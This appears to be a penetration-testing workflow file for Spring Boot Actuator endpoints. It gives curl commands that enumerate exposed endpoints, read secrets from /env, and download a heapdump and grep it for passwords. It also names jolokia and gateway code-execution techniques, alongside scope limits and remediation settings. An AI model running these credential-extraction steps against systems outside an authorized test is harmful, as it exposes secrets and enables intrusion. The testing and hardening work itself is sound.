# Spring Actuator — Deep Workflows

Companion to SKILL.md. Endpoint inventory, heapdump analysis, jolokia.

## Step 1: Endpoint inventory sweep

```bash
BASE=https://target.example.com
for p in actuator health info metrics env beans mappings configprops \
         scheduledtasks httptrace threaddump loggers heapdump shutdown \
         gateway/routes jolokia auditevents startup; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -m 8 "$BASE/$p")
  [ "$code" != "404" ] && echo "[+] /$p -> $code"
done
# Also try under context paths: /api/actuator/... /manage/... /management/
```

## Step 2: Classify exposure severity

```text
health/info only            -> info (usually excluded; skip report)
env                         -> High: property sources incl. masked secrets;
                               check if masking is client-side (JSON keys present)
heapdump                    -> Critical if credentials extractable
mappings                    -> Medium-High: full internal route map incl. hidden APIs
jolokia                     -> Critical potential (MBean invocation)
gateway/routes (SCG)        -> Critical: documented route-injection RCE class
loggers                     -> Medium alone; enables log-based attacks when chained
shutdown (POST enabled)     -> DoS vector; verify policy before any POST
```

## Step 3: env endpoint deep read

```bash
curl -s $BASE/actuator/env | jq '.propertySources[] |
  select(.name | test("application|system")) | .properties'
# Look for: spring.datasource.*, spring.redis.password, aws.secret,
# mail.password. If values show "******" the KEY EXISTENCE is still intel:
# pair with heapdump for real values.
```

## Step 4: heapdump credential extraction workflow

```bash
curl -s $BASE/actuator/heapdump -o hd.hprof   # can be 100s of MB

# Quick pass:
strings -n 12 hd.hprof | grep -E "password|secret|jdbc:" | sort -u | head -40
# Deeper pass with Eclipse MAT or jhat-style analysis:
#   - search String instances matching datasource URL prefixes
#   - follow char[] arrays near keys named password/token
# PROOF RULES: capture ONE credential pair max, REDACT values in report,
# prove validity via harmless authenticated GET only.
```

## Step 5: jolokia MBean surface

```bash
curl -s "$BASE/actuator/jolokia/list" | jq '.value | keys'
# Documented dangerous patterns to CHECK EXISTENCE of (not execute blindly):
#   ch.qos.logback.classic jmx -> JNDI injection gadget class
#   com.mchange:c3p0 -> pool config tampering
# Tomcat MemoryUserDatabase attribute write -> RCE documented technique.
```

## Step 6: Spring Cloud Gateway routes injection (documented class)

```bash
GET $BASE/actuator/gateway/routes    # lists internal routing incl. filters
# Creation/injection via POST requires write access; if writable, the
# documented filter-injection pattern leads to SpEL execution.
# Only demonstrate existence + version match unless scope allows more.
```

## Remediation guidance (for reports)

```yaml
management:
  server:
    port: 127.0.0.1        # separate management port, not exposed
  endpoints.web.exposure.include: health,info
  endpoint.health.probes.enabled: true
# Plus network ACL: mgmt port only from ops subnet; auth on everything else.
```
